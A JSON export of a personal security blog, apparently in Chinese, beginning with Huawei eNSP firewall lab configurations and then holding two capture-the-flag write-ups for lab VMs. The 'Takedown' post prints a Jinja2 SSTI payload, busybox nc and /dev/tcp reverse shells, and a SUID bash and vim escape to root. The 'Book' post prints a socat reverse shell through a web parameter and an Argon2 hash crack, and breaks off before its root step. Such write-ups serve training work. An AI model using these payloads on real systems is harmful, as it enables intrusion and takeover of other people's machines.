mask 24\naddress 10.2.33.0 mask 24\naddress 10.2.34.0 mask 24\naddress 10.2.35.0 mask 24\naddress 10.2.41.0 mask 24\naddress 10.2.42.0 mask 24\naddress 10.2.43.0 mask 24\naddress 10.2.44.0 mask 24\naddress 10.2.45.0 mask 24\naddress 10.2.51.0 mask 24\naddress 10.2.52.0 mask 24\naddress 10.2.53.0 mask 24\naddress 10.2.54.0 mask 24\naddress 10.2.55.0 mask 24\nq\nquit\nquit\n```\n\n### 12.1.2 \u91cd\u5b9a\u5411\u5185\u90e8\u65e0\u7ebf\u8bbf\u95ee\u670d\u52a1\u5668\u6d41\u91cf\n\n#### X_T1_Core1\n\n```\nacl number 3000\nrule permit ip source 10.1.51.0 0.0.0.255 destination 10.1.60.0 0.0.0.255\nrule permit ip source 10.1.52.0 0.0.0.255 destination 10.1.60.0 0.0.0.255\nrule permit ip source 10.1.53.0 0.0.0.255 destination 10.1.60.0 0.0.0.255\nrule permit ip source 10.1.54.0 0.0.0.255 destination 10.1.60.0 0.0.0.255\nrule permit ip source 10.1.55.0 0.0.0.255 destination 10.1.60.0 0.0.0.255\nq\ninterface g0/0/3\n# ensp\u52a0\u4e0d\u4e86\u5b9e\u4f8b\uff0c\u6240\u4ee5\u60f3\u914d\u5c31\u914d\uff0c\u4e0d\u914d\u5c31\u7b97\u4e86\ntrafiic-redirect inbound acl 3000 vpn-ins Employee ip-nexthop 10.1.200.22\nq\n```\n\n### 12.1.3 \u5b89\u5168\u7b56\u7565\n\n#### X_T1_FW1\n\n```\nswitch vsys Employee\nsy\nsecurity-policy\nrule name permit60.101\nsource-zone untrust\ndestination-zone trust\ndestination-address 10.1.60.101 mask 255.255.255.255\nservice http\naction permit\nq\n\nrule name perimit60.100\nsource-zone trust\ndestination-zone trust\nsource-address address-set wlan\ndestination-address 10.1.60.100 mask 255.255.255.255\naction permit\nq\n\nrule name deny60.0\nsource-zone trust\ndestination-zone trust\nsource-address address-set wlan\ndestination-address 10.1.60.100 mask 255.255.255.255\naction deny\nq\n\nrule name Z-Y-X\nsource-zone untrust\nsource-zone trust\ndestination-zone untrust\ndestination-zone trust\nsource-address address-set X-Y-Z\nsource-address address-set market procure hr-finance wlan\ndestination-address address-set market procure hr-finance wlan\ndestination-address address-set X-Y-Z\naction permit\nq\n\nrule name permitany\nsource-zone trust\ndestination-zone untruist\nsource-address address-set wlan\nsource-address address-set market\nsource-address address-set procure\naction permit\nq\nq\nquit\nquit\n```\n\n![image-20250813160936283](http://7r1UMPHK.github.io/image/20250813214050584.webp)\n\n![image-20250813161001465](http://7r1UMPHK.github.io/image/20250813214049075.webp)\n\n## 12.2 vsys Guest\n\n### 12.2.1 \u5730\u5740\u96c6\n\n```\nswitch vsys Guest\nsy\nip address-set Guest type group\naddress 10.1.101.0 mask 24\naddress 10.1.102.0 mask 24\naddress 10.1.103.0 mask 24\naddress 10.1.104.0 mask 24\naddress 10.1.105.0 mask 24\nq\n```\n\n### 12.2.2 \u5b89\u5168\u7b56\u7565\n\n#### \u670d\u52a1\u96c6\n\n```\nip service-set Guest_Service type object 16\nservice 0 protocol tcp destination-port 3389\nq\n```\n\n#### \u5b89\u5168\u7b56\u7565\n\n```\nsecurity-policy\nrule name permit60.99\nsource-zone trust\ndestination-zone untrust\nsource-address address-set Guest\ndestination-address 10.1.60.99 mask 255.255.255.255\nservice Guest_Service\naction permit\nq\n\nrule name deny60.0_Y_Z\nsource-zone trust\ndestination-zone untrust\nsource-address address-set Guest\ndestination-address 10.1.60.0 mask 255.255.255.0\ndestination-address 10.10.0.0 mask 255.255.0.0\ndestination-address 10.100.0.0 mask 255.255.0.0\ndestination-address 10.2.0.0 mask 255.255.0.0\ndestination-address 10.3.0.0 mask 255.255.0.0\naction deny\nrule name permitany\nsource-zone trust\ndestination-zone untrust\nsource-address address-set Guest\naction permit\nq\n```\n\n![image-20250813160805716](http://7r1UMPHK.github.io/image/20250813214046853.webp)\n\n## 12.3 vsys \u4e4b\u95f4\u7684\u8f6c\u53d1\n\n### Employee\n\n```\nswitch vsys Employee\nsy\ninterface Virtual-if1\nip address 10.1.200.253 255.255.255.255\nq\nfirewall zone untrust\nadd interface Virtual-if1\nq\nquit\nquit\n```\n\n### Guest\n\n```\nswitch vsys Guest\nsy\ninterface Virtual-if2\nip address 10.1.200.254 255.255.255.255\nq\nfirewall zone untrust\nadd interface Virtual-if2\nq\nquit\nquit\n```\n\n### \u516c\u5171\n\n```\nip route-static vpn-instance Guest 10.1.60.99 255.255.255.255 vpn-instance Employee\nip route-static vpn-instance Employee 10.1.101.0 255.255.255.0 vpn-instance Guest\nip route-static vpn-instance Employee 10.1.102.0 255.255.255.0 vpn-instance Guest\nip route-static vpn-instance Employee 10.1.103.0 255.255.255.0 vpn-instance Guest\nip route-static vpn-instance Employee 10.1.104.0 255.255.255.0 vpn-instance Guest\nip route-static vpn-instance Employee 10.1.105.0 255.255.255.0 vpn-instance Guest\n```\n\n### Employee\n\n```\nip address-set Guest type group\naddress 10.1.101.0 mask 24\naddress 10.1.102.0 mask 24\naddress 10.1.103.0 mask 24\naddress 10.1.104.0 mask 24\naddress 10.1.105.0 mask 24\nq\n\nip service-set Guest_Service type object 17\nservice 0 protocol tcp destination-port 3389\nq\n\nsecurity-policy\nrule name permit60.99\nsource-zone untrust\ndestination-zone trust\nsource-address address-set Guest\ndestination-address 10.1.60.99 mask 255.255.255.255\nservice Guest_Service\naction permit\n```\n\n# \u9a8c\u8bc1\n\n\u5148\u628aFW1\u7684icmp\u6253\u5f00\n\n```\nicmp ttl-exceeded send\n```\n\n![image-20250813162920742](http://7r1UMPHK.github.io/image/20250813214044313.webp)\n\n![image-20250813163121733](http://7r1UMPHK.github.io/image/20250813214042640.webp)\n\n![image-20250813163304351](http://7r1UMPHK.github.io/image/20250813214038287.webp)sentence", "top": 0, "createdAt": 1755092538, "style": "<style>.markdown-alert{padding:0.5rem 1rem;margin-bottom:1rem;border-left:.25em solid var(--borderColor-default,var(--color-border-default));}.markdown-alert .markdown-alert-title {display:flex;font-weight:var(--base-text-weight-medium,500);align-items:center;line-height:1;}.markdown-alert>:first-child {margin-top:0;}.markdown-alert>:last-child {margin-bottom:0;}</style><style>.markdown-alert.markdown-alert-tip {border-left-color:var(--borderColor-success-emphasis, var(--color-success-emphasis));background-color:var(--color-success-subtle);}.markdown-alert.markdown-alert-tip .markdown-alert-title {color: var(--fgColor-success,var(--color-success-fg));}</style>", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-13", "dateLabelColor": "#0969da"}, "P211": {"htmlDir": "docs/post/hmv_Takedown.html", "labels": ["HackMyVM"], "postTitle": "hmv_Takedown", "postUrl": "post/hmv_Takedown.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/211", "commentNum": 0, "wordCount": 5417, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## **1. \u4e3b\u673a\u53d1\u73b0\u4e0e\u7aef\u53e3\u626b\u63cf**\n\n\u9996\u5148\u4f7f\u7528 `arp-scan` \u5728\u672c\u5730\u7f51\u7edc\u4e2d\u786e\u5b9a\u76ee\u6807\u4e3b\u673a\u7684IP\u5730\u5740\uff0c\u968f\u540e\u5229\u7528 `nmap` \u5bf9\u5176\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u8bc6\u522b\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n**\u4e3b\u673a\u53d1\u73b0:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.131 08:00:27:77:f8:3a     PCS Systemtechnik GmbH\n...\n```\n\n**\u7aef\u53e3\u626b\u63cf:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -p- 192.168.205.131\n...\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\uff0c\u76ee\u6807\u4e3b\u673aIP\u4e3a `192.168.205.131`\uff0c\u5f00\u653e\u4e86 **22 (SSH)** \u548c **80 (HTTP)** \u7aef\u53e3\u3002\n\n## **2. Web\u670d\u52a1\u4fa6\u5bdf**\n\n\u8bbf\u95ee `http://192.168.205.131`\uff0c\u670d\u52a1\u5668\u8fd4\u56de301\u91cd\u5b9a\u5411\uff0c\u6307\u5411\u57df\u540d `http://shieldweb.che/`\u3002\n\n\u5c06\u57df\u540d\u4e0eIP\u5730\u5740\u7ed1\u5b9a\u5230 `/etc/hosts` \u6587\u4ef6\u540e\uff0c\u8fdb\u884c\u5b50\u57df\u540d\u7206\u7834\uff0c\u53d1\u73b0\u4e00\u4e2a\u91cd\u8981\u7684\u5b50\u57df\u540d `ticket.shieldweb.che`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo vim /etc/hosts\n# \u6dfb\u52a0\u4ee5\u4e0b\u884c\n192.168.205.131 shieldweb.che ticket.shieldweb.che\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ wfuzz -c -u 'http://shieldweb.che' -H 'HOST:FUZZ.shieldweb.che' -w /path/to/wordlist.txt --hw 11\n...\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                                                                          \n=====================================================================\n000000453:   200        94 L     180 W      2129 Ch     'ticket - ticket'\n...\n```\n\n\u518d\u6b21\u8bbf\u95ee `http://ticket.shieldweb.che`\uff0c\u53d1\u73b0\u4e00\u4e2a\u8054\u7cfb\u8868\u5355\u9875\u9762\u3002\u76ee\u5f55\u626b\u63cf\u663e\u793a\u5b58\u5728 `/submit` \u8def\u5f84\u3002\n\n# **\u4e8c\u3001\u6f0f\u6d1e\u53d1\u73b0\u4e0e\u521d\u59cb\u8bbf\u95ee**\n\n## **1. SSTI (\u670d\u52a1\u5668\u7aef\u6a21\u677f\u6ce8\u5165)**\n\n\u5728\u8054\u7cfb\u8868\u5355\u7684 `name` \u5b57\u6bb5\u4e2d\u8f93\u5165 `{{7*7}}` \u5e76\u63d0\u4ea4\u5230 `/submit` \u7aef\u70b9\uff0c\u8fd4\u56de\u7ed3\u679c\u4e2d\u663e\u793a\u4e86 `49`\u3002\u8fd9\u8bc1\u5b9e\u4e86\u8be5\u8868\u5355\u5b58\u5728 **Jinja2 \u670d\u52a1\u5668\u7aef\u6a21\u677f\u6ce8\u5165 (SSTI)** \u6f0f\u6d1e\u3002\n\n**\u6f0f\u6d1e\u9a8c\u8bc1:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://ticket.shieldweb.che/submit -X POST -d 'name={{7*7}}&email=a&message=a'\n...\n<div class='response success'>\n    Thank you for your message, 49!\n</div>\n...\n```\n\n## **2. SSTI \u5230 RCE**\n\n\u5229\u7528SSTI\u6f0f\u6d1e\uff0c\u6784\u9020Payload\u4ee5\u6267\u884c\u8fdc\u7a0b\u4ee3\u7801\u3002\u901a\u8fc7\u904d\u5386Python\u5bf9\u8c61\uff0c\u53ef\u4ee5\u8c03\u7528 `os.popen` \u6765\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3002\n\n**\u6267\u884c `id` \u547d\u4ee4:**\n\n```bash\n# Payload: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://ticket.shieldweb.che/submit -X POST -d 'name=%7B%7B%20self.__init__.__globals__.__builtins__.__import__%28%27os%27%29.popen%28%27id%27%29.read%28%29%20%7D%7D&email=1&message=1'\n...\n\n<div class='response success'>\n    Thank you for your message, uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n!\n</div>\n\n...\n```\n\n\u547d\u4ee4\u6210\u529f\u4ee5 `root` \u7528\u6237\u8eab\u4efd\u5728\u4e00\u4e2a\u5bb9\u5668\u5185\u6267\u884c\u3002\n\n## **3. \u83b7\u53d6\u53cd\u5f39Shell (Docker\u5185)**\n\n\u6784\u9020\u53cd\u5f39Shell\u7684Payload\uff0c\u5728\u672c\u5730Kali\u5f00\u542f\u76d1\u542c\uff0c\u6210\u529f\u83b7\u53d6\u4e00\u4e2aDocker\u5bb9\u5668\u5185\u7684 `root` \u6743\u9650Shell\u3002\n\n**\u672c\u5730\u76d1\u542c:**\n\n```bash\nnc -lvnp 8888\n```\n\n**\u6267\u884c\u53cd\u5f39Shell Payload:**\uff08\u53bbweb\u6267\u884c\uff0c\u4e0d\u7136\u4f1a\u6709**shell \u89e3\u6790\u95ee\u9898**\uff09\n\n```bash\n{{ self.__init__.__globals__.__builtins__.__import__('os').popen('busybox nc 192.168.205.128 8888 -e $(which $(echo $0)) ').read() }}\n```\n\n**\u7a33\u5b9ashell\uff1a**\n\n```bash\npython -c 'import pty; pty.spawn('ash')'\nCtrl+Z\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\nexport SHELL=ash\nstty rows 24 columns 80\n```\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## **1. \u5bb9\u5668\u9003\u9038 (Docker -> love)**\n\n\u5728\u83b7\u5f97\u7684Docker Shell\u4e2d\u8fdb\u884c\u4fe1\u606f\u6536\u96c6\uff0c\u53d1\u73b0 `/var/log/access.yml` \u6587\u4ef6\u4e2d\u8bb0\u5f55\u4e86\u4e00\u6761\u53ef\u7591\u7684 `cron` \u8ba1\u5212\u4efb\u52a1\u3002\n\n```bash\n/var/log # cat access.yml\n...\n2023-08-31 22:45:00 - Usuario: A.love - Accion: Tarea cron ejecutada: */5 * * * * root bash /home/love/script/*\n...\n```\n\n\u8be5\u4efb\u52a1\u6bcf5\u5206\u949f\u4ee5 `root` \u6743\u9650\u6267\u884c `/home/love/script/` \u76ee\u5f55\u4e0b\u7684\u6240\u6709\u811a\u672c\u3002\u901a\u8fc7 `linpeas.sh` \u7b49\u5de5\u5177\u6216\u624b\u52a8 `mount` \u68c0\u67e5\uff0c\u53d1\u73b0\u5bbf\u4e3b\u673a\u7684 `/home/love/script` \u88ab\u6302\u8f7d\u5230\u4e86\u5bb9\u5668\u7684 `/script` \u76ee\u5f55\uff0c\u5e76\u4e14\u8be5\u76ee\u5f55\u53ef\u5199\u3002\u8fd9\u662f\u4e00\u4e2a\u5178\u578b\u7684\u5bb9\u5668\u9003\u9038\u8def\u5f84\u3002\n\n1. \u5728\u5bb9\u5668\u7684 `/script` \u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u53cd\u5f39Shell\u811a\u672c\u3002\n\n   ```bash\n   /script # echo 'bash -c '/bin/bash -i >& /dev/tcp/192.168.205.128/8888 0>&1'' > \n   a.sh\n   /script # chmod +x a.sh \n   ```\n\n2. \u5728\u672c\u5730Kali\u5f00\u542f `8888` \u7aef\u53e3\u76d1\u542c\u3002\u7b49\u5f85cron\u4efb\u52a1\u6267\u884c\u540e\uff0c\u6210\u529f\u63a5\u6536\u5230\u5bbf\u4e3b\u673a `love` \u7528\u6237\u7684Shell\u3002\n\n## **2. love -> mitnick**\n\n\u5728 `love` \u7528\u6237\u7684Shell\u4e2d\uff0c\u6267\u884c `sudo -l` \u53d1\u73b0\u5176\u53ef\u4ee5\u514d\u5bc6\u4ee5 `mitnick` \u7528\u6237\u8eab\u4efd\u8fd0\u884c\u4e00\u4e2a\u540d\u4e3a `sas` \u7684\u7a0b\u5e8f\u3002\n\n```bash\nlove@osiris:~$ sudo -l\n...\nUser love may run the following commands on osiris:\n    (mitnick) NOPASSWD: /home/mitnick/sas\n```\n\n\u8fd0\u884c `/home/mitnick/sas` \u540e\u8fdb\u5165\u4e00\u4e2a\u53d7\u9650\u7684\u81ea\u5b9a\u4e49shell\u3002\u8be5shell\u5185\u7f6e\u4e86 `run` \u547d\u4ee4\uff0c\u53ef\u4ee5\u6267\u884c\u5916\u90e8\u811a\u672c\u3002\n\n1. \u5728 `/tmp` \u76ee\u5f55\u521b\u5efa\u4e00\u4e2a\u811a\u672c\uff0c\u7528\u4e8e\u590d\u5236 `/bin/bash` \u5e76\u4e3a\u5176\u8d4b\u4e88SUID\u6743\u9650\u3002\n\n   ```bash\n   love@osiris:/tmp$ echo 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh' > a.sh\n   love@osiris:/tmp$ chmod +x a.sh\n   ```\n\n2. \u901a\u8fc7 `sas` shell\u6267\u884c\u8be5\u811a\u672c\u3002\n\n   ```bash\n   love@osiris:~$ sudo -u mitnick /home/mitnick/sas\n   # run /tmp/a.sh\n   ```\n\n3. \u6267\u884c `/tmp/sh -p`\uff0c\u6210\u529f\u83b7\u5f97 `mitnick` \u7528\u6237\u7684\u6709\u6548\u6743\u9650\u3002\n\n## **3. mitnick -> tomu**\n\n\u5728 `mitnick` \u7528\u6237\u7684\u5bb6\u76ee\u5f55\u4e0b\uff0c\u53d1\u73b0\u4e00\u4e2a\u516c\u94a5\u6587\u4ef6 `publickey.pub` \u548c\u4e00\u4e2a\u52a0\u5bc6\u6587\u4ef6 `secret.enc`\u3002\u901a\u8fc7\u67e5\u770b`publickey.pub`\u53ef\u4ee5\u53d1\u73b0\u8fd9\u662f\u4e00\u4e2a\u975e\u5e38\u77ed\u7684 RSA \u516c\u94a5\uff0c\u957f\u5ea6\u53ea\u6709 **512 \u4f4d**\uff0c\u8fd9\u610f\u5473\u7740**\u53ef\u4ee5\u7528 RSA \u56e0\u6570\u5206\u89e3\u653b\u51fb\u76f4\u63a5\u7206\u7834\u79c1\u94a5**\u3002\n\n1. \u5c06\u8fd9\u4e24\u4e2a\u6587\u4ef6\u4f20\u8f93\u5230\u672c\u5730Kali\u653b\u51fb\u673a\u3002\n\n2. \u4f7f\u7528 `RsaCtfTool` \u5de5\u5177\uff0c\u5229\u7528\u516c\u94a5\u6765\u89e3\u5bc6\u6587\u4ef6\u3002\n\n   ```bash\n   \u250c\u2500\u2500(kali\u327fkali)-[~]\n   \u2514\u2500$ RsaCtfTool --publickey publickey.pub --decryptfile secret.enc --private\n   ...\n   utf-8 : sh1m0mur4Bl4ckh4t\n   ...\n   ```\n\n3. \u6210\u529f\u89e3\u5bc6\u51fa\u5bc6\u7801\uff1a`sh1m0mur4Bl4ckh4t`\u3002\n\n4. \u5728 `/home` \u76ee\u5f55\u4e0b\u53d1\u73b0\u53e6\u4e00\u7528\u6237 `tomu`\u3002\u4f7f\u7528\u521a\u89e3\u51fa\u7684\u5bc6\u7801\u6210\u529f\u5207\u6362\u5230 `tomu` \u7528\u6237\u3002\n\n## **4. tomu -> root**\n\n\u5728 `tomu` \u7528\u6237\u7684Shell\u4e2d\uff0c\u518d\u6b21\u6267\u884c `sudo -l`\uff0c\u53d1\u73b0\u53ef\u4ee5\u514d\u5bc6\u4ee5 `root` \u8eab\u4efd\u8fd0\u884c `/opt/Contempt/Contempt`\u3002\n\n```bash\ntomu@osiris:~$ sudo -l\n...\nUser tomu may run the following commands on osiris:\n    (root) /opt/Contempt/Contempt\n```\n\n\u6267\u884c\u8be5\u7a0b\u5e8f\u540e\uff0c\u51fa\u73b0\u4e00\u4e2a\u83dc\u5355\u3002\u9009\u62e9 `2` (Ayuda) \u4f1a\u4f7f\u7528 `vim` \u6253\u5f00\u5e2e\u52a9\u6587\u6863\u3002`vim` \u5728\u4ee5`sudo`\u6743\u9650\u8fd0\u884c\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u5185\u90e8\u547d\u4ee4\u9003\u9038\u5230shell\u3002\n\n1. \u6267\u884c\u63d0\u6743\u547d\u4ee4\u3002\n\n   ```bash\n   tomu@osiris:~$ sudo /opt/Contempt/Contempt\n   ```\n\n2. \u5728\u7a0b\u5e8f\u83dc\u5355\u4e2d\u9009\u62e9 `2`\uff0c\u8fdb\u5165 `vim` \u754c\u9762\u3002\n\n3. \u5728 `vim` \u547d\u4ee4\u6a21\u5f0f\u4e0b\uff0c\u8f93\u5165 `!bash` \u6216 `!sh` \u5e76\u56de\u8f66\u3002\n\n   ```vim\n   :!bash\n   ```\n\n4. \u6210\u529f\u83b7\u53d6 `root` \u6743\u9650\u7684\u4ea4\u4e92\u5f0fShell\u3002\n\n**\u6700\u7ec8\u5728 `/root` \u548c `/home/tomu` \u76ee\u5f55\u4e0b\u627e\u5230flag\u3002**\n\n```bash\nroot@osiris:~# cat /root/root.sh\n...\nflag --> 1e271c5ce97e76ae8417a95c74085fba\n...\nroot@osiris:~# cat /home/tomu/user.txt\n612701a03669485d94bc687449fdab39\n```sentence", "top": 0, "createdAt": 1755135762, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-14", "dateLabelColor": "#0969da"}, "P212": {"htmlDir": "docs/post/nei-bu-_Book.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Book", "postUrl": "post/nei-bu-_Book.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/212", "commentNum": 0, "wordCount": 3912, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## **1. \u4e3b\u673a\u53d1\u73b0\u4e0e\u7aef\u53e3\u626b\u63cf**\n\n\u9996\u5148\u5728\u672c\u5730\u7f51\u7edc\u4e2d\u4f7f\u7528 `arp-scan` \u786e\u5b9a\u76ee\u6807\u4e3b\u673a\u7684IP\u5730\u5740\uff0c\u968f\u540e\u5229\u7528 `nmap` \u5bf9\u5176\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u8bc6\u522b\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n**\u4e3b\u673a\u53d1\u73b0:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.142 08:00:27:5d:bd:e0       PCS Systemtechnik GmbH\n...\n```\n\n**\u7aef\u53e3\u626b\u63cf:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -p- 192.168.205.142\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 08:53 EDT\nNmap scan report for 192.168.205.142\nHost is up (0.00014s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n443/tcp open  https\nMAC Address: 08:00:27:5D:BD:E0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.10 seconds```\n```\n\n\u626b\u63cf\u7ed3\u679c\u8868\u660e\uff0c\u76ee\u6807\u4e3b\u673aIP\u4e3a `192.168.205.142`\uff0c\u5f00\u653e\u4e86 **22 (SSH)**\u3001**80 (HTTP)** \u548c **443 (HTTPS)** \u7aef\u53e3\u3002\u8bbf\u95ee80\u7aef\u53e3\u4f1a\u81ea\u52a8\u8df3\u8f6c\u5230443\u7aef\u53e3\u3002\n\n## **2. \u670d\u52a1\u4fa6\u5bdf**\n\n* **HTTPS (443\u7aef\u53e3):** \u8bbf\u95ee\u8be5\u670d\u52a1\u53d1\u73b0\u662f\u4e00\u4e2a\u57fa\u4e8e\u5f00\u6e90\u9879\u76ee `cstimer` \u7684\u9b54\u65b9\u8ba1\u65f6\u7f51\u7ad9\u3002\n\n  > [!Tip]\n  >\n  > https://github.com/cs0x7f/cstimer\n\n  ![image-20250814205523360](C:\\Users\\ABCDEFG888\\AppData\\Roaming\\Typora\\typora-user-images\\image-20250814205523360.png)\n\n# **\u4e8c\u3001\u6f0f\u6d1e\u53d1\u73b0\u4e0e\u521d\u59cb\u8bbf\u95ee**\n\n## **1. Web\u53c2\u6570\u6a21\u7cca\u6d4b\u8bd5\u4e0eRCE**\n\n\u5bf9\u7f51\u7ad9\u8fdb\u884c\u53c2\u6570\u6a21\u7cca\u6d4b\u8bd5\uff0c\u53d1\u73b0\u4e00\u4e2a\u540d\u4e3a `cmd` \u7684\u53c2\u6570\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff08RCE\uff09\u6f0f\u6d1e\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'https://192.168.205.142?FUZZ=id' --fw 3928\n\n...\ncmd                     [Status: 200, Size: 55130, Words: 3930, Lines: 359, Duration: 228ms]\n...\n```\n\n## **2. \u83b7\u53d6 www-data Shell**\n\n\u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\uff0c\u76ee\u6807\u4e3b\u673a\u4e0a\u6ca1\u6709 `busybox` \u548c `curl`\uff0c\u76f4\u63a5\u4f7f\u7528 `bash` \u53cd\u5f39shell\u4e5f\u5931\u8d25\uff08\u53ef\u80fd\u662f\u6211\u7684\u95ee\u9898\uff0c\u4f60\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b\uff09\u3002\u6700\u7ec8\u9009\u62e9\u4f7f\u7528 `socat` \u6765\u83b7\u53d6\u53cd\u5f39shell\u3002\n\n**\u672c\u5730\u76d1\u542c:**\n\n```bash\nnc -lvnp 8888\n```\n\n**\u6267\u884cPayload:**\n\n```bash\n# \u5229\u7528 socat \u53cd\u5f39 shell\nhttps://192.168.205.142/?cmd=socat TCP:192.168.205.128:8888 EXEC:$(which $(echo $0))\n```\n\n\u6210\u529f\u63a5\u6536\u5230 `www-data` \u7528\u6237\u7684shell\u540e\uff0c\u4e3a\u4e86\u4fbf\u4e8e\u64cd\u4f5c\uff0c\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5e8f\u5217\u6765\u83b7\u5f97\u4e00\u4e2a\u529f\u80fd\u5b8c\u6574\u7684TTY\u3002\n\n```bash\nscript /dev/null -c bash\n# \u6309\u4e0b Ctrl+Z\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\nexport SHELL=/bin/bash\nstty rows 24 columns 80\n```\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## **1. www-data -> room**\n\n\u5728 `www-data` shell\u4e2d\uff0c\u67e5\u770b `/home` \u76ee\u5f55\u53d1\u73b0\u5b58\u5728\u7528\u6237 `room`\u3002\u5c1d\u8bd5\u4f7f\u7528\u5f31\u53e3\u4ee4 `room` \u8fdb\u884c\u7528\u6237\u5207\u6362\uff0c\u6210\u529f\u5207\u6362\u5230 `room` \u7528\u6237\u3002\n\n```bash\nwww-data@Book:/home$ su room \nPassword: room\nroom@Book:/home$ id\nuid=1001(room) gid=1001(room) groups=1001(room)\n```\n\n## **2. room -> root**\n\n1. **\u672c\u5730\u670d\u52a1\u53d1\u73b0:** \u6210\u4e3a `room` \u7528\u6237\u540e\uff0c\u4f7f\u7528 `ss -tnlp` \u547d\u4ee4\u53d1\u73b0\u672c\u5730 `127.0.0.1` \u7684 `8888` \u7aef\u53e3\u4e0a\u8fd0\u884c\u7740\u4e00\u4e2a\u670d\u52a1\u3002\n\n   ```bash\n   room@Book:~$ ss -tnlp\n   State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    \n   ...     \n   LISTEN    0         128              127.0.0.1:8888             0.0.0.0:*\n   ...\n   ```\n\n   \u901a\u8fc7 `wget` \u8bbf\u95ee\u8be5\u670d\u52a1\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a Jupyter Server \u7684\u767b\u5f55\u9875\u9762\u3002\n\n2. **\u51ed\u8bc1\u53d1\u73b0\u4e0e\u7834\u89e3:** \u5728 `/var/backups/` \u76ee\u5f55\u4e0b\u627e\u5230\u4e00\u4e2aJupyter\u7684\u914d\u7f6e\u6587\u4ef6 `jupyter_server_config.json`\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u4e2a `argon2` \u683c\u5f0f\u7684\u54c8\u5e0c\u5bc6\u7801\u3002\n\n   ```bash\n   room@Book:/var/backups$ cat jupyter_server_config.json\n   {\n     'IdentityProvider': {\n       'hashed_password': 'argon2:$argon2id$v=19$m=10240,t=10,p=8$FLuM1EM1nn/EP9ni1ust1A$BSnZUgXixY8B0Tzmffcz/9Zo9cvEO/PeAu8zw/iYNI4'\n     }\n   }\n   ```\n\n   \u4f7f\u7528 `Argon2Cracker` \u5de5\u5177\u548c\u5b57\u5178\u5bf9\u8be5\u54c8\u5e0c\u8fdb\u884c\u7834\u89e3\uff0c\u6210\u529f\u5f97\u5230\u660e\u6587\u5bc6\u7801 `star123`\u3002\n\n   > [!Tip]\n   >\n   > https://github.com/p0dalirius/Argon2Cracker\n\n   ```bash\n   \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/Argon2Cracker]\n   \u2514\u2500$ python3 Argon2Cracker.py '$argon2id$v=19$m=10240,t=10,p=8$FLuM1EM1nn/EP9ni1ust1A$BSnZUgXixY8B0Tzmffcz/9Zo9cvEO/PeAu8zw/iYNI4' -w ../5000h.txt  \n   ...\n   [>] Found: star123\n   ```\n\n3. **\u83b7\u53d6Root\u6743\u9650:**\n\n  